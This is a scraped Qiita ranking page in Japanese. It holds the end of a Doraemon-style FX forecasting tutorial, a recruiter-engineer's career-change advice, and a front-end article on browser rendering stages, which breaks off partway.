<p><a href="https://camo.qiitausercontent.com/d98e1db3a21c35850f18b671c0941253db066fa3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39313233336162342d616331342d336566322d393932662d6361343133636466343032322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d98e1db3a21c35850f18b671c0941253db066fa3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39313233336162342d616331342d336566322d393932662d6361343133636466343032322e706e67" alt="nobitafx1_2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/91233ab4-ac14-3ef2-992f-ca413cdf4022.png"></a></p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="c1"># 2017年からのデータをプロットしてみます</span>
<span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">(</span><span class="n">data17</span><span class="p">[</span><span class="s1">'Close'</span><span class="p">])</span>
<span class="n">plt</span><span class="o">.</span><span class="n">ylim</span><span class="p">([</span><span class="mi">95</span><span class="p">,</span><span class="mi">125</span><span class="p">])</span>
</pre></div></div>

<p><a href="https://camo.qiitausercontent.com/9800043aa357f13f52aade5a9524b368e17b1a69/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f38323235326336612d323739392d303235342d666466662d6238316461396561376136622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9800043aa357f13f52aade5a9524b368e17b1a69/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f38323235326336612d323739392d303235342d666466662d6238316461396561376136622e706e67" alt="nobitafx1_3.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/82252c6a-2799-0254-fdff-b81da9ea7a6b.png"></a></p>

<p>トレンドってのは傾向のことで、一方向に上がり続けたり、下がり続けたりすることだよ。<br>
2016年は、前半はブレエグジットなんかがあって、ずっと下がり傾向で、後半はトランプ大統領への期待から、上がり傾向の、大きなトレンドが生まれていた年だったんだよ。</p>

<p>でも2017年は、そうした大きな傾向があまりないんだよ。<br>
同じ範囲内を上がったり、下がったりしている、レンジ相場っていうんだ。<br>
「今日の終値が昨日の終値よりも高かったら、きっと明日も高くなる。」って考える人もいれば、<br>
「今日の終値が昨日の終値よりも高くて、もう十分。きっと明日は安くなる。」って考える人も多いってことさ。</p>

<p>そうか～、せっかく考えたぼくの作戦はダメなのか・・・</p>

<p>そんなことないよ、のび太くん。<br>
2016年がプラスだったように、相場にトレンドがあるときにはのび太くんの作戦も使えないことはない。</p>

<p>う～ん、難しいんだね・・・</p>

<p>いや、のび太くんにしては、ここまで考えてやってみただけでも、十分さ！<br>
今日はここまでして、次回はもっと良い方法を使ってみよう。</p>

<p>良い方法？</p>

<p>機械学習と呼ばれる手法さ。<br>
はじめは単純な機械学習から実装してみて、うまくいく方法を探してみよう。</p>

<p>よし、次こそ、iPhone Xが買える作戦を立てるぞ！</p>

<p>その意気だ！のび太くん。<br>
次回は、「線形モデルによる回帰分析」で、FX予測をしてみよう。</p>

<p>１０００系モデルによる怪奇分析？<br>
よく分からないけど、大丈夫かな・・・</p>

<p>大丈夫だよ、細かい理論や実装方法は、僕がきちんと解説するから。</p>

<p>・<br>
・<br>
・</p>

<p><a href="https://qiita.com/sugulu/items/b6f891e060beab94b99b" id="reference-dcee39de5cac32320d73">「第2話：のび太、線形回帰を学ぶ」</a>に続く</p>

<hr>

<p>以上、ご一読いただきありがとうございます。<br>
記事やコードの間違え、改善点、不明点など、気軽にコメントいただければ幸いです。<br>
感謝</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">19位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>478</kbd>
		<a target="_blank" href="https://qiita.com/newta/items/9620056bb991f4b0f03d">エンジニアが転職する時に考えることを採用面接官をしてる立場から書いてみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-03<br />22:03:55</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/17213.html">newta</a>(48件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/17213/profile-images/1473682092">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[アジャイル]</b> <b>[転職]</b> <b>[採用]</b> <b>[キャリア]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><a href="https://qiita.com/yama-t/items/0dc67cda41a2eb710eeb" id="reference-995834b6a1502a2066e1">エンジニアの転職メモ</a> を読んで、刺激を受けたので書いてみました。</p>

<p>非常に共感しました！<br>
自分的にちょっと気になるところ+αを書こうかなと。</p>

<p>書かれたことは会社的な方針ではなく、個人としての観点です。</p>

<h2>
<span id="自分誰よ" class="fragment"></span><a href="#%E8%87%AA%E5%88%86%E8%AA%B0%E3%82%88"><i class="fa fa-link"></i></a>自分誰よ</h2>

<p>とある企業で採用の一次面接に呼ばれたりする現場のエンジニアです。<br>
Javaエンジニアです。Scalaもたまに書いてました。<br>
転職回数は片手では足りないくらいの回数をしています。</p>

<p>最近はエンジニアマネジメントの比重が多く、ほとんどコード書いてないです。<br>
コードは書いていませんがレビューや調査では読んだりします。<br>
アーキテクチャ、フレームワーク選定、インフラ方針などの決定権は持っていて、<br>
ビジネスバランスを取りながら実装の方針などを決めます。</p>

<h2>
<span id="採用面接官のエンジニアは現場エンジニアが多い" class="fragment"></span><a href="#%E6%8E%A1%E7%94%A8%E9%9D%A2%E6%8E%A5%E5%AE%98%E3%81%AE%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%81%AF%E7%8F%BE%E5%A0%B4%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%81%8C%E5%A4%9A%E3%81%84"><i class="fa fa-link"></i></a>採用面接官のエンジニアは現場エンジニアが多い</h2>

<h3>
<span id="人事によるピックアップとは別" class="fragment"></span><a href="#%E4%BA%BA%E4%BA%8B%E3%81%AB%E3%82%88%E3%82%8B%E3%83%94%E3%83%83%E3%82%AF%E3%82%A2%E3%83%83%E3%83%97%E3%81%A8%E3%81%AF%E5%88%A5"><i class="fa fa-link"></i></a>人事によるピックアップとは別</h3>

<p>前提として技術力はエンジニアしか判断できないと思っています。<br>
でも、採用のフロントに出て調整してくれたり、人材候補を見つけるのは人事の仕事になります。<br>
人事は技術そのものが理解できるわけではないので高性能なキーワードフィルターのような捌き方になるのかなーと想像しています。</p>

<p>フィルタを通過した人に対して、現場のエンジニアに判定をアサインします。<br>
現場エンジニアの採用への意欲や人事とエンジニアの連携の度合いは会社や部署によります。<br>
その前提で・・・</p>

<h2>
<span id="url共有について思うところ" class="fragment"></span><a href="#url%E5%85%B1%E6%9C%89%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E6%80%9D%E3%81%86%E3%81%A8%E3%81%93%E3%82%8D"><i class="fa fa-link"></i></a>URL共有について思うところ</h2>

<p>URL共有はメリットは大きいですが、人事判定を行うには扱うのが難しいのではと想像しています。<br>
現場エンジニアとの連携力の高い会社で無ければ、弾かれてしまう可能性はあります。<br>
スカウトなどで会社側からアプローチされている場合には問題がないとおもいます。<br>
個人的には表現のサブツールとして使うのがベストじゃないかと思っています。</p>

<p>ちなみにウチはURL共有でも全然気にしません。</p>

<h2>
<span id="履歴書" class="fragment"></span><a href="#%E5%B1%A5%E6%AD%B4%E6%9B%B8"><i class="fa fa-link"></i></a>履歴書</h2>

<p>ほとんど見ません。年齢と通勤時間くらい。中途の場合、学歴より実力と実績なので。<br>
アピールしたいことがあれば職務経歴書の方に枠を作って書いたほうが良いです。<br>
動機やPRの項目ですが、実際に実績をPRするには通常の履歴書フォーマットの枠では足りないです。<br>
職務履歴書などの最初や最後に追加で自分で枠を作ったほうが良いです。</p>

<p>手書きの必要は全く無いです。<br>
僕も転職のときには全てデジタルでした。</p>

<h2>
<span id="職務履歴書のoss管理について" class="fragment"></span><a href="#%E8%81%B7%E5%8B%99%E5%B1%A5%E6%AD%B4%E6%9B%B8%E3%81%AEoss%E7%AE%A1%E7%90%86%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>職務履歴書のOSS管理について</h2>

<p>面白いと思います！自分は人事フィルタで除外されない自信がある人だけ行って下さい。</p>

<h4>
<span id="なぜなら" class="fragment"></span><a href="#%E3%81%AA%E3%81%9C%E3%81%AA%E3%82%89"><i class="fa fa-link"></i></a>なぜなら</h4>

<p>１つめに<br>
Webは１ページリンクごとしか見れず、人事の人がまとめて扱いにくいので、大抵プリントアウトして使います。<br>
そうするとWebのページはたいてい見づらいです。文脈に従ってページ送りされるわけではないですし、リンクも死にます。<br>
僕も印刷したものを渡される時もあるんですが、見づらいです。<br>
１人に対してのみ吟味する感覚のときは悪くはないと思います。</p>

<p>２つめに<br>
ただし、ユーザ企業のいるSI系や開発中のプロジェクトだと、プロジェクトの全てをオープンな場で書くわけにはいかないことがあると思うので、自分の職歴と相談してみて下さい。<br>
直近やってることが一番自分のレベルが高いはずなので、非公開の開発情報は強いんじゃないのかな・・・？</p>

<p>３つめに<br>
職務履歴書はフォーマットは無いです。WebでもOK。<br>
その辺の落ちているものを使っても良いですが、自分の仕事をうまく説明出来るフォーマットを自由にExcelなどで作ってしまえば良いです。<br>
僕の場合もどこかの経歴書を参考に自分でほしい項目を足して、いらない項目は消しました。</p>

<p>OSS管理は自分での管理と一本釣りに近い形の採用には向いていますが、まとめてリサーチされるときには気をつけて欲しいかなと思います。</p>

<h2>
<span id="エンジニアが転職するときの強みになること" class="fragment"></span><a href="#%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%81%8C%E8%BB%A2%E8%81%B7%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AE%E5%BC%B7%E3%81%BF%E3%81%AB%E3%81%AA%E3%82%8B%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>エンジニアが転職するときの強みになること</h2>

<p>転職したい時にスキルを整理するのでは少し遅いケースがあります。<br>
中級エンジニアになったならば、自分の強みをどこにもつのかをしっかり定義して、実務のレベルをあげるとともに戦略的に自分の実力が分かる見栄えのある技術アピール方法を考えて、積み重ねておくべきかと思います。</p>

<p>実力と表現は両軸で持つことで自分のやりたいことに近い会社を選ぶことが出来ると思います。</p>

<h1>
<span id="転職を決める前にしてほしいこと" class="fragment"></span><a href="#%E8%BB%A2%E8%81%B7%E3%82%92%E6%B1%BA%E3%82%81%E3%82%8B%E5%89%8D%E3%81%AB%E3%81%97%E3%81%A6%E3%81%BB%E3%81%97%E3%81%84%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>転職を決める前にしてほしいこと</h1>

<h3>
<span id="-自分の実力表現の実績の積み上げ" class="fragment"></span><a href="#-%E8%87%AA%E5%88%86%E3%81%AE%E5%AE%9F%E5%8A%9B%E8%A1%A8%E7%8F%BE%E3%81%AE%E5%AE%9F%E7%B8%BE%E3%81%AE%E7%A9%8D%E3%81%BF%E4%B8%8A%E3%81%92"><i class="fa fa-link"></i></a>◯ 自分の実力表現の実績の積み上げ</h3>

<h4>
<span id="社内勉強会や社外勉強会カンファレンスでの発表" class="fragment"></span><a href="#%E7%A4%BE%E5%86%85%E5%8B%89%E5%BC%B7%E4%BC%9A%E3%82%84%E7%A4%BE%E5%A4%96%E5%8B%89%E5%BC%B7%E4%BC%9A%E3%82%AB%E3%83%B3%E3%83%95%E3%82%A1%E3%83%AC%E3%83%B3%E3%82%B9%E3%81%A7%E3%81%AE%E7%99%BA%E8%A1%A8"><i class="fa fa-link"></i></a>社内勉強会や社外勉強会、カンファレンスでの発表</h4>

<p>資料があると、どんなことに興味があるか、どんなレベルで調べるかが分かります。<br>
カンファレンスはよほどの勇気と実力がないと厳しいですが、小さな勉強会のLTはいつでも募集されていますし、社内で有志のチームで勉強会をしても良いです。<br>
技術者にとって発信力も力の一つです</p>

<h4>
<span id="qiitaなどへの技術メモ" class="fragment"></span><a href="#qiita%E3%81%AA%E3%81%A9%E3%81%B8%E3%81%AE%E6%8A%80%E8%A1%93%E3%83%A1%E3%83%A2"><i class="fa fa-link"></i></a>Qiitaなどへの技術メモ</h4>

<p>Qiitaなどへ技術メモがあると興味分野が分かります<br>
実力が分かるレベルで深いことを書いている人は少ない<br>
自主学習力などの一部は分かる</p>

<h4>
<span id="社内での技術採用やプロジェクト立ち上げ役回りの獲得" class="fragment"></span><a href="#%E7%A4%BE%E5%86%85%E3%81%A7%E3%81%AE%E6%8A%80%E8%A1%93%E6%8E%A1%E7%94%A8%E3%82%84%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E7%AB%8B%E3%81%A1%E4%B8%8A%E3%81%92%E5%BD%B9%E5%9B%9E%E3%82%8A%E3%81%AE%E7%8D%B2%E5%BE%97"><i class="fa fa-link"></i></a>社内での技術採用やプロジェクト立ち上げ、役回りの獲得</h4>

<p>肩書きって実力や実務ではあんまり関係ないです。<br>
偉くなってもコードが上手く書けるようになるわけじゃないので。<br>
でも、転職のときには他者へどのレベルなのかを証明しやすい目安になります。<br>
人事の人でもなんとなく分かる。<br>
チャンスがあったら実務は変わらないけど、肩書きがもらえるケースは表明してしまう旨さがあったら良いかもです。<br>
現場リーダー、サーバーサイドアーキテクト、マネージャ、フロントリードエンジニア、など。</p>

<h4>
<span id="説明しやすい現場事例" class="fragment"></span><a href="#%E8%AA%AC%E6%98%8E%E3%81%97%E3%82%84%E3%81%99%E3%81%84%E7%8F%BE%E5%A0%B4%E4%BA%8B%E4%BE%8B"><i class="fa fa-link"></i></a>説明しやすい現場事例</h4>

<ul>
<li>改善の導入提案と導入実績

<ul>
<li>提案と実際に導入のために動くのは、実は雲泥の差があるので導入して欲しい。</li>
<li>どうしても提案しか出来ない現場だったら、どこまで自分で他者の立場と技術メリットを理解して提案したかを説明出来るレベルに。</li>
<li>フレームワークなど技術系とアジャイルエッセンスなどの開発プロセス系などの両軸であると思う</li>
</ul>
</li>
<li>開発チーム立ち上げ、プロジェクト初期エンジニア

<ul>
<li>技術選定やチームでの方針決定のルール決めなど沢山の問題が山積みになる</li>
<li>自分の存在感を出したエピソードを</li>
</ul>
</li>
<li>他にもまだまだありそう

<ul>
<li>今ちょっと思いつかないけど</li>
</ul>
</li>
</ul>

<h3>
<span id="-自分の実力の積み上げ" class="fragment"></span><a href="#-%E8%87%AA%E5%88%86%E3%81%AE%E5%AE%9F%E5%8A%9B%E3%81%AE%E7%A9%8D%E3%81%BF%E4%B8%8A%E3%81%92"><i class="fa fa-link"></i></a>◯ 自分の実力の積み上げ</h3>

<h4>
<span id="情報アンテナの追加" class="fragment"></span><a href="#%E6%83%85%E5%A0%B1%E3%82%A2%E3%83%B3%E3%83%86%E3%83%8A%E3%81%AE%E8%BF%BD%E5%8A%A0"><i class="fa fa-link"></i></a>情報アンテナの追加</h4>

<ul>
<li>Twitterのスペシャリストのフォロー,Facebookなど</li>
<li>勉強会</li>
<li>AWS、GCP、各種プログラミング言語、フレームワークなどの公式サイト</li>
<li>技術系ニュースサイト Qiita、TechCrunch、CodeZineなど</li>
<li>企業技術ブロク</li>
</ul>

<h4>
<span id="利用技術幅を広げる" class="fragment"></span><a href="#%E5%88%A9%E7%94%A8%E6%8A%80%E8%A1%93%E5%B9%85%E3%82%92%E5%BA%83%E3%81%92%E3%82%8B"><i class="fa fa-link"></i></a>利用技術幅を広げる</h4>

<ul>
<li>複数の言語</li>
<li>クライアントサイド(HTML,CSS,JS)、サーバサイド、インフラ、ミドルウェア</li>
<li>パブリッククラウド</li>
<li>大規模データ、機械学習</li>
<li>ちなみに機械学習はちょっと出来ますくらいだと、あんまり仕事増えないです(強みにするには数学的な知識が必要)</li>
</ul>

<h4>
<span id="強みの部分を極める深く理解する" class="fragment"></span><a href="#%E5%BC%B7%E3%81%BF%E3%81%AE%E9%83%A8%E5%88%86%E3%82%92%E6%A5%B5%E3%82%81%E3%82%8B%E6%B7%B1%E3%81%8F%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>強みの部分を極める、深く理解する</h4>

<ul>
<li>得意言語のフレームワークを複数理解して選択出来るようにする</li>
<li>言語の特徴と強みを理解して、仕様やリファレンスもなるべく網羅する</li>
</ul>

<h4>
<span id="プログラミングや開発の原則やデザインの理解" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E3%82%84%E9%96%8B%E7%99%BA%E3%81%AE%E5%8E%9F%E5%89%87%E3%82%84%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3%E3%81%AE%E7%90%86%E8%A7%A3"><i class="fa fa-link"></i></a>プログラミングや開発の原則やデザインの理解</h4>

<ul>
<li>プログラミングの原則</li>
<li>GoFのデザインパターン</li>
<li>関数型でデザインパターン</li>
<li>テスト駆動開発</li>
<li>クラウドデザインパターン</li>
</ul>

<h4>
<span id="開発プロセスの効率化" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AE%E5%8A%B9%E7%8E%87%E5%8C%96"><i class="fa fa-link"></i></a>開発プロセスの効率化</h4>

<ul>
<li>アジャイル開発の概念</li>
<li>手法の勉強 - スクラム、XP、リーン</li>
<li>プロセス適応の導入実績</li>
</ul>

<p>たぶん実力の方は履歴書や職歴書などの紙の情報で説明するのは難しい。<br>
でも、面接などで技術に対する一問一答でその深さは測ったりするので、これがないと書類に通っても面接には通らなかったりする。<br>
適当なとこだと通ってしまうけど、実務でどうせ使うので実力は上げたいよね。</p>

<h2>
<span id="転職におけるやりたいことの明確化" class="fragment"></span><a href="#%E8%BB%A2%E8%81%B7%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E3%82%84%E3%82%8A%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8%E3%81%AE%E6%98%8E%E7%A2%BA%E5%8C%96"><i class="fa fa-link"></i></a>転職におけるやりたいことの明確化</h2>

<p>年齢にあった実力とあったやりたいことである必要がある。</p>

<p>20代であれば、ヤル気と行動がちゃんと揃っているか。<br>
XXX言語に興味があってやりたいです！って言った時に、その環境をやるのに障害になっているものになっているものは何か？<br>
無料で全部揃えられるはずなのに、何も手を付けていなければ、残念ながら興味があるとは言えないです。</p>

<p>30代であれば、例えば技術を伸ばしていきたいと言っても、30代になってくると誰かに教えると言うことが当然に出てくる。<br>
その時に発信力があるか、リーダーシップを発揮できるかを見る。<br>
もしくは１人で作りきった技術の高さ。それは海外の一次情報などにアクセスして作るレベルじゃないと、技術レベルが高いとは言えないです。<br>
マネジメント系がやりたいのであれば開発プロセスの知識を勉強しているかを問います。<br>
これも興味があっても、なんの勉強もしていなければ20代の人と同じです。<br>
実務経験は会社の環境によって出来ないことがあるので、出来る範囲でどこまで自分が知識を得ているかです。</p>

<p>次にビジネスや事業の改善に興味がありますと言う人が居ます。<br>
そのときに、市場の成長感や同じ業種の上場企業のP/LやB/Sを見て、その感覚を少しでも得ようとしているでしょうか？<br>
受ける会社の機能や競合の企業の機能は一通り見ているのでしょうか？</p>

<p>エンジニアが他の領域の話をしようと思ったら気をつけて下さい。<br>
技術を極めていないのに、ビジネスに興味があると言っているが、何の数字も感覚も出てこないのであれば<br>
平凡なエンジニアという判断になってしまうかもしれません。</p>

<h2>
<span id="まとめまとまってない" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81%E3%81%BE%E3%81%A8%E3%81%BE%E3%81%A3%E3%81%A6%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>まとめ(まとまってない)</h2>

<p>なんとなく普段から思ってることを書いてみました。</p>

<p>採用側も全てがパーフェクトな人間では無いです。<br>
人事は技術が分からず、採用に出てくる現場エンジニアは面接官のプロではなく、採用エンジニア専任は現場のニーズを全て理解してるわけではないです。</p>

<p>その中で、自分を一番伝えれる形を模索して行くしか無いです。<br>
採用としても出来るだけ強みを引き出したくて話を聞いていて、会社で活躍してくれる人を探しています。</p>

<p>他にも何か質問等があったらなんでも答えます。</p>

<p>いいねされると嬉しいです。ぜひ良いねしていって下さい。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">20位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>464</kbd>
		<a target="_blank" href="https://qiita.com/mikimhk/items/7cfbd6c94d0f3d7aa51f">【フロントエンドエンジニアだからこそ】ブラウザレンダリングを理解するため簡単にまとめてみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-22<br />14:41:44</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/42808.html">mikimhk</a>(4件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/42808/profile-images/1506061508">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[HTML]</b> <b>[CSS]</b> <b>[JavaScript]</b> <b>[フロントエンド]</b> <b>[速度改善]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>初投稿です。よろしくお願いします(/･ω･)/</p>

<p>新卒入社してフロントエンドエンジニアとして働き始めて早半年。<br>
最近は、自分の書いたコードが世の中にリリースされて嬉しさを噛み締めながら楽しく社会人生活を送っています。</p>

<h1>
<span id="こんな本を読み始めました" class="fragment"></span><a href="#%E3%81%93%E3%82%93%E3%81%AA%E6%9C%AC%E3%82%92%E8%AA%AD%E3%81%BF%E5%A7%8B%E3%82%81%E3%81%BE%E3%81%97%E3%81%9F"><i class="fa fa-link"></i></a>こんな本を読み始めました</h1>

<p><a href="https://www.amazon.co.jp/dp/4774189677/ref=cm_sw_r_tw_dp_x_.H2WzbZVB428T" rel="nofollow noopener" target="_blank">Webフロントエンド ハイパフォーマンス チューニング　-久保田 光則 (著)</a></p>

<p>webパフォーマンスについて...要はサイトの <strong>速度改善</strong> について学べる本です。</p>

<p>冒頭に「ウェブパフォーマンスとは何か」が書かれてます。</p>

<blockquote>
<p>ウェブパフォーマンスを改善することは、ユーザが目的の達成の為に費やす時間やリソースを節約させることであり、その節約した分ユーザを豊かにしているわけです。</p>

<p>ウェブページ遷移時の初期ロード時のパフォーマンスだけでなく<br>
ウェブページ内でのインタラクション(ユーザが起こした操作に対しての応答)の描画のパフォーマンスが重要になってきます。</p>
</blockquote>

<p>読み込み遅くてスクロールできないーとか、クリックしたのに反応遅いーとか<br>
イラつきますよね。そうすると離れますよね。あるある。</p>

<p>でも折角作ったサイトが勿体無い。</p>

<p>じゃあ<strong>フロントエンドエンジニアとして何が出来るのか?!</strong><br>
って話がたくさん書いてあります。</p>

<h1>
<span id="レンダリングの仕組みを知ろう" class="fragment"></span><a href="#%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0%E3%81%AE%E4%BB%95%E7%B5%84%E3%81%BF%E3%82%92%E7%9F%A5%E3%82%8D%E3%81%86"><i class="fa fa-link"></i></a>レンダリングの仕組みを知ろう</h1>

<p>どういった技があるのかなーと読み進めると<br>
最初にレンダリングの話がありました。</p>

<p>何故か。</p>

<blockquote>
<p>テクニックがなぜ有効かを正しく理解しなければ、実際の目の前のウェブページに正しく適用することは出来ないからです。</p>

<p>開発者はその(パフォーマンス測定の)結果が意味するところは何なのかを理解し、その上でボトルネックを特定する必要があります。これらを読み解くには、ブラウザが何をしているのかを知らなくてはいけません。<br>
そのためにも、ウェブ開発者はレンダリングの流れをおおまかにでも押さえておく必要があります。</p>
</blockquote>

<p>なるほど。<br>
私は作るのが好きでコーディングしてきただけの人間なので、全然レンダリングの流れ知りません。<br>
なので、本を読みつつ、実際に検証っぽいのをしてみました。</p>

<h2>
<span id="レンダリングの流れ" class="fragment"></span><a href="#%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0%E3%81%AE%E6%B5%81%E3%82%8C"><i class="fa fa-link"></i></a>レンダリングの流れ</h2>

<p>ブラウザのレンダリングには4つの工程があります。<br>
最終的に描画されるまでをフレーム(Frame)と呼びます。<br>
<a href="https://camo.qiitausercontent.com/8f48ec24aa2b06d382cc5373dc00a37e1cda71be/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34323830382f64303833616437342d346338352d386238652d646663622d3162663062626139343931662e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8f48ec24aa2b06d382cc5373dc00a37e1cda71be/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34323830382f64303833616437342d346338352d386238652d646663622d3162663062626139343931662e6a706567" alt="20170921.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/42808/d083ad74-4c85-8b8e-dfcb-1bf0bba9491f.jpeg"></a></p>

<ul>
<li>Loading

<ul>
<li>Download</li>
<li>Parse</li>
</ul>
</li>
<li>Scripting</li>
<li>Rendering

<ul>
<li>CalculateStyle</li>
<li>Layout</li>
</ul>
</li>
<li>Painting

<ul>
<li>Paint</li>
<li>Rasterize</li>
<li>CompositeLayers</li>
</ul>
</li>
</ul>

<h2>
<span id="1-loading" class="fragment"></span><a href="#1-loading"><i class="fa fa-link"></i></a>1. Loading</h2>

<p>ここでは2つの処理が行われています。</p>

<h3>
<span id="download" class="fragment"></span><a href="#download"><i class="fa fa-link"></i></a><strong>Download</strong>
</h3>

<p>ウェブページ(HTML)自身を含むリソース</p>

<ul>
<li>HTMLファイル</li>
<li>CSSファイル</li>
<li>JavaScriptファイル</li>
<li>jpeg、png、gif、svg などの画像ファイル</li>
</ul>

<p>をサーバからダウンロードする。</p>

<h3>
<span id="parse" class="fragment"></span><a href="#parse"><i class="fa fa-link"></i></a><strong>Parse</strong>
</h3>

<p>ダウンロードしたリソースを<strong>パース(構文分析)</strong>してレンダリングエンジンの内部表現に変換する。</p>

<p>HTMLファイル → DOMツリー<br>
CSSファイル → CSSOMツリー</p>

<h2>
<span id="2-scripting" class="fragment"></span><a href="#2-scripting"><i class="fa fa-link"></i></a>2. Scripting</h2>

<p>次に　JavaScriptのコードをJavaScriptエンジンに引き渡して実行させます。</p>

<p><strong>【 流れ 】</strong><br>
<strong>JavaScriptのコード</strong> → <code>字句解析</code> → <strong>トークン列</strong> <br>
　→ <code>構文解析</code> → <strong>抽象構文木</strong> → <code>コンパイル</code> → <strong>実行可能コード</strong> → <code>実行</code></p>

<p>コードのトークン列をパースして抽象構文木を作成し、コンパイルすると、初めて実行可能に！<br>
JSの実行は、最初にJSファイルを読み込んだ時以外では、DOMイベントが発火しイベントリスナが起動する時にも起こる。</p>

<h2>
<span id="3-rendering" class="fragment"></span><a href="#3-rendering"><i class="fa fa-link"></i></a>3. Rendering</h2>

<p>ここでも2つの処理が行われています。</p>

<h3>
<span id="calculatestyle" class="fragment"></span><a href="#calculatestyle"><i class="fa fa-link"></i></a><strong>CalculateStyle</strong>
</h3>

<p>ドキュメントのDOMツリー内の全てのDOM要素に対して、どのようなCSSプロパティが当たるのかを計算する。<br>
CSSルールのCSSセレクタがマッチするかを総当りで試行する。(総当りとか...がむしゃらな感じ 何それ可愛い)<br>
そのあと個別のDOM要素に対して、どのようなCSSプロパティが適用されるかを判断する。</p>

<h3>
<span id="layout" class="fragment"></span><a href="#layout"><i class="fa fa-link"></i></a><strong>Layout</strong>
</h3>

<p>CSSプロパティを算出した後、レンダリングエンジンはDOMツリー内全てのノードの視覚的なレイアウト情報の計算、<strong>レイアウト</strong>を行う。</p>

<p>レイアウト情報とは</p>

<ul>
<li>要素の大きさ</li>
<li>要素のmargin</li>
<li>要素のpadding</li>
<li>要素の位置</li>
<li>要素のz軸の位置</li>
</ul>

<p>のこと。</p>

<h2>
<span id="4-painting" class="fragment"></span><a href="#4-painting"><i class="fa fa-link"></i></a>4. Painting</h2>

<p>レイアウト情報の算出が終わると、最後のレンダリング結果の<strong>描画</strong>に移ります。</p>

<h3>
<span id="paint" class="fragment"></span><a href="#paint"><i class="fa fa-link"></i></a><strong>Paint</strong>
</h3>

<p>DisplayListと呼ばれる内部の低レベルな2Dグラフィックエンジン向けの命令の列を生成する。<br>
この辺でブラウザの実装毎にグラフィックエンジンの異なりが出てくる。</p>

<h3>
<span id="rasterize" class="fragment"></span><a href="#rasterize"><i class="fa fa-link"></i></a><strong>Rasterize</strong>
</h3>

<p>生成された命令を用いて実際にピクセル(ビットマップ)へと描画する。<br>
レイヤーごとに一枚一枚描画されていく。<br>
レイヤーが生成されるのは要素に対して <code>position</code> や <code>transform</code> , <code>opacity</code>などのプロパティが適用されている時。</p>

<h3>
<span id="compositelayers" class="fragment"></span><a href="#compositelayers"><i class="fa fa-link"></i></a><strong>CompositeLayers</strong>
</h3>

